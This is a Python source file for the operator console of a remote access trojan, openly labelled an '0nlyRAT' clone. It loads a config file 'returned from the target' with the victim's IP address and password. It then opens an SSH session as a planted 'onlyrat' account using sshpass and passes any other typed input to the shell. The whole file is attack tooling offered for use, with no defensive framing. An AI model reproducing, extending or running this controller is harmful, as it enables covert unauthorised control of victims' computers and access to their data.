#!/usr/bin/python
# python console for the RAT to interact with target pc

import os
import sys
import getpass

banner = r"""
  /$$$$$$            /$$           /$$$$$$$   /$$$$$$  /$$$$$$$$
 /$$$_  $$          | $$          | $$__  $$ /$$__  $$|__  $$__/
| $$$$\ $$ /$$$$$$$ | $$ /$$   /$$| $$  \ $$| $$  \ $$   | $$   
| $$ $$ $$| $$__  $$| $$| $$  | $$| $$$$$$$/| $$$$$$$$   | $$   
| $$\ $$$$| $$  \ $$| $$| $$  | $$| $$__  $$| $$__  $$   | $$   
| $$ \ $$$| $$  | $$| $$| $$  | $$| $$  \ $$| $$  | $$   | $$   
|  $$$$$$/| $$  | $$| $$|  $$$$$$$| $$  | $$| $$  | $$   | $$   
 \______/ |__/  |__/|__/ \____  $$|__/  |__/|__/  |__/   |__/   
                         /$$  | $$                              
                        |  $$$$$$/                              
                         \______/                               
 
                
            [::] The Famous 0nlyRAT Clone Project :) [::]
"""

help_menu = """
            [::] 0nlyRAT help menu [::]

            [+] Arguments:            
                                                   ____                                                               ____  
                                                  |                                                                       |
                                                  |  place the config file name with extension returned from the target   |
                python3 main.py <config file>   = |                                                                       |
                                                  |  File must have .rat extension                                        |
                                                  |____                                                               ____|
            
"""

options_menu = """
            [+] commands:
                [0] Remote Console

            [+] Options:
                [-h] or [--help]     ---   help
                [-u] or [--update]   ---   update
                [-r] or [--remove]   ---   remove


            * any other commands will be a default
              terminal command
"""

username = getpass.getuser()
header = f"[~] {username}@onlyrat $ "
IP_KEY = "IPADDRESS"
PASS_KEY = "PASSWORD"
WORKINGDIR_KEY = "WORKINGDIR"
STARTUPDIR_KEY = "STARTUPDIR"

def read_config(config_file):
    if not os.path.exists(config_file):
        raise FileNotFoundError
    configuration = {}
    read_lines = open(config_file, "r").readlines()
    configuration[IP_KEY] = read_lines[0].strip()
    configuration[PASS_KEY] = read_lines[1].strip()
    configuration[WORKINGDIR_KEY] = read_lines[2].strip()
    configuration[STARTUPDIR_KEY] = read_lines[3].strip()
    return configuration

# remotely connect RAT to target
def connect(tgt_ipv4,tgt_pword):
    os.system(f"sshpass -p \"{tgt_pword}\" ssh onlyrat@{tgt_ipv4}")

def exit():
    print("[*] exiting...")
    sys.exit(1)

def clear():
    os.system("clear")

def os_detection():
    if os.name == "nt":
        return "w"
    if os.name == "posix":
        return "l"

def update():
    return

def remove():
    return

# command line interface
def cli(arguments):
    clear()
    print(banner)
    if arguments:
        argument = sys.argv[1]
        if argument.endswith(".rat"):
            try:
                configuration = read_config(argument)
            except FileNotFoundError:
                print(f"Error: Config file '{argument}' does not exist.")
                exit()
            tgt_ipv4 = configuration.get(IP_KEY)
            tgt_pword = configuration.get(PASS_KEY)
            tgt_wd = configuration.get(WORKINGDIR_KEY)
            print(options_menu)
            print("\t    [*] type \"help\" for help menu [*]\n")
            while True:
                option = input(f"{header}")
                if option == "0":
                    connect(tgt_ipv4,tgt_pword)
                elif option == "help":
                    clear()
                    print(banner)
                    print(options_menu)
                elif option in ["quit", "exit"]:
                    exit()
                else:
                    os.system(option)
                print("\n")
        elif argument in ["-h","--help"]:
            print(help_menu)
        elif argument in ["-u","--update"]:
            update()
        elif argument in ["-r","--remove","--uninstall"]:
            remove()
    else:
        print(help_menu)

def main():
    clear()
    # checks for arguments
    try:
        sys.argv[1]
    except IndexError:
        arguments_exist = False
    except Exception:
        arguments_exist = False
    else:
        arguments_exist = True
    # run commandline interface
    cli(arguments_exist)

if __name__ == "__main__":
    main()